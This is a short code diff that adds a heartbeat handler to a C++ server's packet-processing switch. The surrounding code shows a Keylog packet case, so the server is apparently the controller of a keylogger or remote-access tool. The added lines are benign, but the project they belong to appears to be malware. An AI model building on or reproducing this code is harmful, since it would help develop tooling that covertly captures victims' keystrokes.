@@ -206,6 +206,15 @@ bool Server::ProcessPacket(int ID, PacketType _packettype)
 		fflush(NULL);
 		break;
 	}
+	case PacketType::Heartbeat:
+	{
+		std::string h;
+		if (!GetString(ID, h))
+			return false;
+		//std::cout << "Got heartbeat: " << h.c_str() << std::endl;
+		if (*(char*)h.c_str() != 'h') return false;
+		break;
+	}
 	case PacketType::Keylog:
 	{
 		std::string log; //string to store file name
